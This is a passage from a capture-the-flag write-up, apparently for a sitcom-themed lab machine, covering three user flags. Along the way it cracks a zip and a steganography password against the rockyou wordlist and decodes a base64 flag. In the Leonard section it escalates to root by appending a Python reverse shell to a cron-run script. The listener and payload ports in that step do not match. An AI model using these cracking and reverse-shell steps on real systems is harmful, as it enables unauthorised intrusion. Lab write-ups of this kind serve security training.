   SF:069cf8}\n")%r(oracle-tns,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069
   SF:cf8}\n")%r(ms-sql-s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\
   SF:n")%r(afp,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(giop
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n");

### Howard

To unencrypt the zip, we can use joh to crack the password

Use zip2john to put the zip into an hash

   zip2john super_secret_nasa_stuff_here.zip > zip-hash.txt

Then execute:
   john --wordlist=/usr/share/wordlists/rockyou.txt zip-hash.txt

```
   Using default input encoding: UTF-8
   Loaded 1 password hash (PKZIP [32/64])
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   astronaut        (super_secret_nasa_stuff_here.zip/marsroversketch.jpg)     
   1g 0:00:00:00 DONE (2025-11-08 06:39) 100.0g/s 7372Kp/s 7372Kc/s 7372KC/s ryanscott..compusa
   Use the "--show" option to display all of the cracked passwords reliably
   Session completed.
```

Inside of it, there is an image, that we are going to try and check if it has anything hidden. To hide something inside an image you always need a password, so we are going to install stegcracker to also brute-force the password

Using:

   stegcracker marsroversketch.jpg
```
   StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
   Copyright (c) 2025 - Luke Paris (Paradoxis)

   StegCracker has been retired following the release of StegSeek, which 
   will blast through the rockyou.txt wordlist within 1.9 second as opposed 
   to StegCracker which takes ~5 hours.

   StegSeek can be found at: https://github.com/RickdeJager/stegseek

   No wordlist was specified, using default rockyou.txt wordlist.
   Counting lines in wordlist..
   Attacking file 'marsroversketch.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
   Successfully cracked file with password: iloveyoumom
   Tried 51221 passwords
   Your file has been written to: marsroversketch.jpg.out
   iloveyoumom
```
Then, we get file marsroversketch.jpg.out and read it, that has howards flag

FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}

### Penny

We go inside the shell, into /home/penny

Do a ls -al and find the file .FLAG.penny.txt

And we find an encode string, we do

   echo 'RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=' | base64 -d

And get the flag

   FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25} 

### Leonard

Do a ls -al and it has root permissions 'thermostat_set_temp.sh'

Then I check if VM has python, python --version

Create a reverse shell with python (go to revshells.com and choose one with python since the system has python)

On my machine:

   nc -lvnp 9002

Then, on the target machine, add a reverse shell to the following script with root permissions (thermostat_set_temp.sh)
The following command adds a line to the script, since we can't edit it using nano, for example
Since we have the information the script executed every minute from what Leonard had in one of his files, it will be automatically executed

   echo "export RHOST="{LOCAL_MACHINE_IP}";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'" >> thermostat_set_temp.sh

Then we can check the shell on our side and get the flag

FLAG-leonard{17fc95224b65286941c54747704acd3e}